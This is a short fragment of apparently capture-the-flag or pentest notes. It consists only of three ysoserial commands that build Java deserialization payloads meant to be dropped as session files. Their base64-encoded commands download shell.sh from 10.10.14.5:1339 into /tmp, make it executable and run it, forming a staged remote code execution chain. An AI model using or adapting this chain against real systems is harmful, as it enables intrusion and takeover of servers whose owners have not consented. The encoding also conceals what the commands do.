...
java -jar ~/Downloads/ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash -c {echo,Y3VybCBodHRwOi8vMTAuMTAuMTQuNToxMzM5L3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=}|{base64,-d}|{bash,-i}' > pp0.session
...
java -jar ~/Downloads/ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash -c {echo,Y2htb2QgK3ggL3RtcC9zaGVsbC5zaA==}|{base64,-d}|{bash,-i}' > pp1.session
...
java -jar ~/Downloads/ysoserial-master-6eca5bc740-1.jar CommonsCollections2 'bash -c {echo,YmFzaCAtYyAvdG1wL3NoZWxsLnNo}|{base64,-d}|{bash,-i}' > pp2.session
